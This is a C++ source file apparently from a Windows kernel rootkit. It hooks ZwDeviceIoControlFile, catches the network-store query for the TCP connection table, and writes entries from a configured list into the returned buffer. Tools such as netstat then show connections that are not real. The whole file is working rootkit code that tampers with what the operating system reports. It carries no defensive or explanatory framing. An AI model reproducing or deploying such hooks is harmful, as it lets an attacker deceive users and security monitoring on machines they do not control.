
#include "ZwDeviceIoControlFileHooks.h"

void AddTcpInTable(PNSI_PARAM ptrNsiParam)
{
	auto tcpList = RootkitHooksConfig::getInstance().GetTcpEntryList();
	
	auto unusedMemmory = ((PBYTE)&ptrNsiParam->tcpTable[ptrNsiParam->tcpConnectionCount - 1] - (PBYTE)ptrNsiParam->statusTable);
	auto possibleNewConnections = unusedMemmory / sizeof(INTERNAL_TCP_TABLE_ENTRY);
	auto tcpTable = ptrNsiParam->tcpTable;
	
	for (int i = 0; i < possibleNewConnections; i++)
	{
		if (tcpList.GetLinks().Flink)
		{
			tcpList = tcpList.Next();
		}
		else
		{
			break;
		}
		

		auto currentNode = tcpList.GetCurrentNode();
		tcpTable[ptrNsiParam->tcpConnectionCount].localEntry.ipAddr = currentNode.localEntry.ipAddr;
		tcpTable[ptrNsiParam->tcpConnectionCount].localEntry.port = currentNode.localEntry.port;
		tcpTable[ptrNsiParam->tcpConnectionCount].localEntry.stub1 = 2;

		tcpTable[ptrNsiParam->tcpConnectionCount].remoteEntry.ipAddr = currentNode.remoteEntry.ipAddr;
		tcpTable[ptrNsiParam->tcpConnectionCount].remoteEntry.port = currentNode.remoteEntry.port;
		tcpTable[ptrNsiParam->tcpConnectionCount].remoteEntry.stub1 = 2;

		auto statusTable = ptrNsiParam->statusTable;

		RtlCopyMemory(&statusTable[ptrNsiParam->tcpConnectionCount], statusTable, sizeof(NSI_STATUS_ENTRY));

		ptrNsiParam->tcpConnectionCount += 1;		
	}
}

NTSTATUS ZwDeviceIoControlFileHook_AddElement(
	IN HANDLE FileHandle,
	IN HANDLE Event,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcContext,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG IoControlCode,
	IN PVOID InputBuffer,
	IN ULONG InputBufferLength,
	OUT PVOID OutputBuffer,
	IN ULONG OutputBufferLength)
{

	auto hookData = SplicingManager::getInstance().GetHookByAddres((ULONG_PTR)&ZwDeviceIoControlFileHook_AddElement);	

	auto originalFunc = reinterpret_cast<ZW_DEVICE_IO_CONTROL_FILE>(hookData.wrapper);	
	
	NTSTATUS status = originalFunc(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength);

	if (!NT_SUCCESS(status))
		return status;	

	
	if (IoControlCode != 0x12001B)
	{
		return status;
	}

	if (OutputBuffer == NULL)
	{
		return status;
	}

	PNSI_PARAM ptrNsiParam = reinterpret_cast<PNSI_PARAM>(OutputBuffer);
	
	if (ptrNsiParam->typeInfo != 0x38)
	{
		return status;
	}	

	AddTcpInTable(ptrNsiParam);
	
	return status;
}
